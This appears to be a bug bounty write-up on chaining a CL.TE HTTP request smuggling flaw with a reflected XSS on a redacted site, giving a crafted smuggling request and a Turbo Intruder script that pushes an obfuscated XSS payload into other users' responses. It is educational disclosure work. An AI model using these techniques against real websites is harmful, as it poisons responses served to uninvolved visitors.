---
title: "Escalating Reflected XSS with HTTP Smuggling"
date: 2021-02-11
description: "Using HTTP Request Smuggling to escalate reflected XSS to site-wide attack"
tags: ["HTTP Smuggling", "XSS", "Bug Bounty"]
---

*This vulnerability was found on a private programme, therefore parts have been redacted.*

As with the majority of HTTP Smuggling, it started with a smuggle probe from Burp's [HTTP Request Smuggler Extension](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646):

![img](https://i.imgur.com/gtsdXYX.png)

Unfortunately there was nothing interesting on the back-end to attempt to bypass the front-end security controls, or no sensitive information being passed from users to attempt to capture their requests. However, earlier a common reflected XSS was found:

![img](https://i.imgur.com/fuDt3ri.png)

Which in the source code looked like:
![img](https://i.imgur.com/h6XMxRp.png)


Which made me think, could we force other users to search for the reflected XSS, escalating it to site-wide, no user interaction XSS?

I crafted the following request to test the identified `CL.TE` vulnerability:

```
POST /redacted.aspx HTTP/1.1
 Transfer-Encoding: chunked
Host: redacted.com
Content-Length: 21
X-Blah-Ignore: chunked

0

GET /404
Foo: x
```

This request works by taking advantage of discrepancies in HTTP specifications, which provides two different methods for specifying the length of HTTP messages:

* The front-end server processes the `Content-Length:` header, which forwards the whole request.
* The back-end uses `Transfer-Encoding: chunked` processing only the first chunk, which is set at 0 length, which in chunked encoding will terminate the request.
* The remaining bytes `GET /404` are left unprocessed, which the back-end will process these bytes as the start of the next request. `GET /404` was chosen as it returns a `404`, making it easier to identify if the vulnerability exists.
* When sending the request twice, a `404` is returned for the second request, showing the `GET /404` has successfully been processed within the next request.



This led onto launching a `CL.TE` smuggle attack with the following **Turbo Intruder** payload, including the XSS vulnerability:

```python
def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )

    prefix = '''GET /redacted.aspx?redacted=1"*%2Fconfirm%0B(1)<%2FScript%2F--><Script>%2F* HTTP/1.1
X-Ignore: X'''

    attack = target.req + prefix
    engine.queue(attack)

    victim = target.req
    for i in range(7):
        engine.queue(victim)
        time.sleep(0.05)


def handleResponse(req, interesting):
    table.add(req)
```

and sure enough, the request was successfully smuggled, and one of the next requests received the poisoned XSS response:

> *XSS being smuggled*
>![img](https://i.imgur.com/StC9vG6.png)
>
>![img](https://i.imgur.com/ebCcdDJ.png)

> *Later response poisoned with XSS*
>![img](https://i.imgur.com/WlPViEN.png)
>
>![img](https://i.imgur.com/vjgQP0m.png)


Although this programme accepted reflected XSS as is, this same approach could have been used to chain together XSS with CSRF or a CORS misconfiguration. If the attack kept being fired, nearly every user who visited the site would receive a poisoned response.

[Extra reading on HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)